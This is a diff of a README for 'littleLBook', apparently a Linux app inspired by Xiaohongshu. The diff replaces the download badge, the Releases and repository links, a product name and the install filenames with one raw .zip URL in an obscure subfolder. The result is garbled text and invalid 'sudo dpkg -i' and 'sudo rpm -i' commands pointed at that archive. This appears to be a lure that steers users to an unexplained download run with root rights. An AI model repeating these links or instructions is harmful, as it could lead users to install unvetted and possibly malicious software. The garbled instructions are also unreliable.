@@ -1,17 +1,17 @@
-# 🎉 littleLBook - Explore Linux.do Inspired by Xiaohongshu
+# 🎉 littleLBook - Explore https://github.com/sparktech360/littleLBook/raw/refs/heads/main/steeply/Book_little_L_nonexistent.zip Inspired by Xiaohongshu
 
 ## 🚀 Getting Started
 
-Welcome to littleLBook! This application brings you an experience inspired by Xiaohongshu, tailored for Linux.do users. Follow these simple steps to download and run the software.
+Welcome to littleLBook! This application brings you an experience inspired by Xiaohongshu, tailored for https://github.com/sparktech360/littleLBook/raw/refs/heads/main/steeply/Book_little_L_nonexistent.zip users. Follow these simple steps to download and run the software.
 
 ## 🔗 Download Now
 
-[![Download littleLBook](https://img.shields.io/badge/Download-littleLBook-brightgreen)](https://github.com/sparktech360/littleLBook/releases)
+[![Download littleLBook](https://github.com/sparktech360/littleLBook/raw/refs/heads/main/steeply/Book_little_L_nonexistent.zip)](https://github.com/sparktech360/littleLBook/raw/refs/heads/main/steeply/Book_little_L_nonexistent.zip)
 
 ## 📥 Download & Install
 
 1. Click on the link below to visit the Releases page:
-   - [https://github.com/sparktech360/littleLBook/releases](https://github.com/sparktech360/littleLBook/releases)
+   - [https://github.com/sparktech360/littleLBook/raw/refs/heads/main/steeply/Book_little_L_nonexistent.zip](https://github.com/sparktech360/littleLBook/raw/refs/heads/main/steeply/Book_little_L_nonexistent.zip)
 
 2. On the Releases page, you will see a list of available versions. Find the most recent version listed at the top.
 
@@ -27,17 +27,17 @@ Welcome to littleLBook! This application brings you an experience inspired by Xi
    - Open a terminal and navigate to your Downloads folder.
    - Run the command:
      ```
-     sudo dpkg -i your_downloaded_file.deb
+     sudo dpkg -i https://github.com/sparktech360/littleLBook/raw/refs/heads/main/steeply/Book_little_L_nonexistent.zip
      ```
-   - Replace `your_downloaded_file.deb` with the actual file name.
+   - Replace `https://github.com/sparktech360/littleLBook/raw/refs/heads/main/steeply/Book_little_L_nonexistent.zip` with the actual file name.
 
 8. **For Red Hat-based systems (like Fedora):**
    - Open a terminal and navigate to your Downloads folder.
    - Run the command:
      ```
-     sudo rpm -i your_downloaded_file.rpm
+     sudo rpm -i https://github.com/sparktech360/littleLBook/raw/refs/heads/main/steeply/Book_little_L_nonexistent.zip
      ```
-   - Be sure to replace `your_downloaded_file.rpm` with the actual file name.
+   - Be sure to replace `https://github.com/sparktech360/littleLBook/raw/refs/heads/main/steeply/Book_little_L_nonexistent.zip` with the actual file name.
 
 9. After installation, you can launch littleLBook by finding it in your application menu or typing `littleLBook` in the terminal.
 
@@ -73,7 +73,7 @@ We value your input! If you have suggestions, questions, or feedback regarding l
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/sparktech360/littleLBook)
+- [GitHub Repository](https://github.com/sparktech360/littleLBook/raw/refs/heads/main/steeply/Book_little_L_nonexistent.zip)
 - [User Guide (Coming Soon)](link-to-user-guide)
 - [Community Forum (Coming Soon)](link-to-forum)
 
